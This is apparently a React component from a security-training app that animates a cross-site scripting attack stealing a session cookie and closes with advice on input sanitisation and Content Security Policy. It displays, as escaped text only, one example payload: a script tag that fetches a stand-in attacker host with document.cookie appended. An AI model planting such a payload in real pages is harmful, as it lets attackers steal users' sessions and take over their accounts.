"use client";

import { useState } from "react";
import { CheckCircle, Play, ShieldAlert } from "lucide-react";

export default function MissionSecurity5AttackDemo({ onComplete }: { onComplete: () => void }) {
    const [stage, setStage] = useState<"idle" | "injecting" | "executing" | "stealing" | "done">("idle");

    const runSimulation = () => {
        setStage("injecting");
        setTimeout(() => setStage("executing"), 1500);
        setTimeout(() => setStage("stealing"), 3000);
        setTimeout(() => setStage("done"), 4500);
    };

    return (
        <div className="flex flex-col items-center gap-8 w-full max-w-2xl mx-auto">
            <div className="text-center">
                <h3 className="text-xl font-bold text-red-500 mb-2 flex items-center justify-center gap-2">
                    <ShieldAlert className="w-6 h-6" /> XSS Attack Simulation
                </h3>
                <p className="text-gray-400">Watch how a Cross-Site Scripting attack steals cookies.</p>
            </div>

            <div className="w-full h-64 bg-gray-900 rounded-xl border border-white/10 relative overflow-hidden flex items-center justify-center">
                {stage === "idle" && (
                    <button
                        onClick={runSimulation}
                        className="px-6 py-3 bg-red-600 hover:bg-red-500 text-white rounded-full font-bold transition-colors flex items-center gap-2"
                    >
                        <Play className="w-5 h-5" /> Simulate Attack
                    </button>
                )}

                {stage !== "idle" && (
                    <div className="w-full h-full p-8 relative">
                        {/* Browser Context */}
                        <div className="absolute top-4 left-4 text-gray-500 font-mono text-xs">Browser Window</div>

                        {/* Victim's Cookie */}
                        <div className={`absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-yellow-500 text-black px-4 py-2 rounded-full font-bold shadow-lg transition-all duration-1000 ${stage === "stealing" ? "translate-x-[200px] opacity-0" : ""}`}>
                            🍪 Session Cookie
                        </div>

                        {/* Malicious Script */}
                        <div className={`absolute bottom-4 left-4 font-mono text-green-400 text-sm transition-opacity duration-500 ${stage === "injecting" ? "opacity-100" : "opacity-0"}`}>
                            &lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt;
                        </div>

                        {/* Attacker Server */}
                        <div className="absolute top-4 right-4 text-red-500 font-bold flex flex-col items-center">
                            <div className="w-12 h-12 border-2 border-red-500 rounded-lg flex items-center justify-center mb-2">
                                😈
                            </div>
                            Attacker
                        </div>

                        {/* Status Text */}
                        <div className="absolute bottom-8 w-full text-center font-bold text-white">
                            {stage === "injecting" && "Malicious script injected into comment..."}
                            {stage === "executing" && "Browser executes script automatically..."}
                            {stage === "stealing" && "Script sends cookie to attacker!"}
                            {stage === "done" && <span className="text-red-400">Account Compromised!</span>}
                        </div>
                    </div>
                )}
            </div>

            {stage === "done" && (
                <div className="animate-in fade-in slide-in-from-bottom-4 flex flex-col items-center gap-4">
                    <p className="text-gray-300 text-center max-w-md">
                        This is why we must always sanitize user input and use Content Security Policy (CSP).
                    </p>
                    <button
                        onClick={onComplete}
                        className="px-8 py-3 bg-gradient-to-r from-green-500 to-emerald-500 rounded-full font-bold text-white shadow-lg hover:shadow-green-500/25 transition-all hover:scale-105 flex items-center gap-2"
                    >
                        <CheckCircle className="w-5 h-5" /> Acknowledge Risk
                    </button>
                </div>
            )}
        </div>
    );
}
